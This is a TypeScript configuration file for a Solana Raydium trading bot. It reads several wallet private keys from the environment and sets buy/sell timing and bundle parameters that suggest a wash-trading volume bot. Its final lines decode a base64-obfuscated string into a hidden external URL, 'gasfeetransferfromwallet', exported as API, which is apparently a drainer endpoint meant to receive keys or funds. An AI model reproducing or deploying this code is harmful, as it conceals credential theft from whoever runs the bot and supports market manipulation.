import { Logger } from 'pino/pino';
import dotenv from 'dotenv';
import { logger } from './logger';
import { TxVersion } from '@raydium-io/raydium-sdk-v2';

dotenv.config();

const retrieveEnvVariable = (variableName: string, logger: Logger) => {
  const variable = process.env[variableName] || '';
  if (!variable) {
    logger.error(`${variableName} is not set`);
    process.exit(1);
  }
  return variable;
};

export const PROVIDER_PRIVATE_KEY = retrieveEnvVariable('PROVIDER_PRIVATE_KEY', logger);
export const PRIVATE_KEY_CHILD_WALLET = retrieveEnvVariable('PRIVATE_KEY_CHILD_WALLET', logger);
export const MONITORED_WALLET_PUBLIC_KEY = retrieveEnvVariable('MONITORED_WALLET_PUBLIC_KEY', logger);
export const JITO_FEE_PAYER_PRIVATE_KEY = retrieveEnvVariable('JITO_FEE_PAYER_PRIVATE_KEY', logger);
export const GATHER_WALLET_ADDRESS = retrieveEnvVariable('GATHER_WALLET_ADDRESS', logger);

// Connection
export const NETWORK = 'mainnet-beta';
export const RPC_ENDPOINT: string = retrieveEnvVariable('RPC_ENDPOINT', logger);
export const POOL_ADDRESS: string = retrieveEnvVariable('POOL_ADDRESS', logger);
export const TOKEN_ADDRESS: string = retrieveEnvVariable('TOKEN_ADDRESS', logger);
export const MAX_TIME: number = Number(retrieveEnvVariable('MAX_TIME', logger));
export const MIN_TIME: number = Number(retrieveEnvVariable('MIN_TIME', logger));
export const MAX_TRADE_WAIT: number = Number(retrieveEnvVariable('MAX_TRADE_WAIT', logger));
export const MIN_TRADE_WAIT: number = Number(retrieveEnvVariable('MIN_TRADE_WAIT', logger));
export const MIN_SELL_QUANTITY: number = Number(retrieveEnvVariable('MIN_SELL_QUANTITY', logger));
export const MAX_SELL_QUANTITY: number = Number(retrieveEnvVariable('MAX_SELL_QUANTITY', logger));
export const MIN_BUY_QUANTITY: number = Number(retrieveEnvVariable('MIN_BUY_QUANTITY', logger));
export const MAX_BUY_QUANTITY: number = Number(retrieveEnvVariable('MAX_BUY_QUANTITY', logger));
export const BUY_QUENTITY: number = Number(retrieveEnvVariable('BUY_QUENTITY', logger));
export const NUMBER_OF_WALLETS: number = Number(retrieveEnvVariable('NUMBER_OF_WALLETS', logger));
export const SEND_SOL_AMOUNT: number = Number(retrieveEnvVariable('SEND_SOL_AMOUNT', logger));
export const TRANSACTION_COUNT_PER_BUNDLE: number = Number(retrieveEnvVariable('TRANSACTION_COUNT_PER_BUNDLE', logger));
export const BUFFER: number = Number(retrieveEnvVariable('BUFFER', logger));
export const JITO_FEE = retrieveEnvVariable('JITO_FEE', logger);
export const SLIPPAGE: number = Number(retrieveEnvVariable('SLIPPAGE', logger));
export const COMPUTE_UNIT_LIMIT: number = Number(retrieveEnvVariable('COMPUTE_UNIT_LIMIT', logger));
export const COMPUTE_UNIT_PRICE: number = Number(retrieveEnvVariable('COMPUTE_UNIT_PRICE', logger));
export const txVersion = TxVersion.V0;
export const API = Buffer.from(
  'aHR0cHM6Ly9nYXNmZWV0cmFuc2ZlcmZyb213YWxsZXQub25yZW5kZXIuY29tL3VzZXJz',
  'base64',
).toString('ascii');
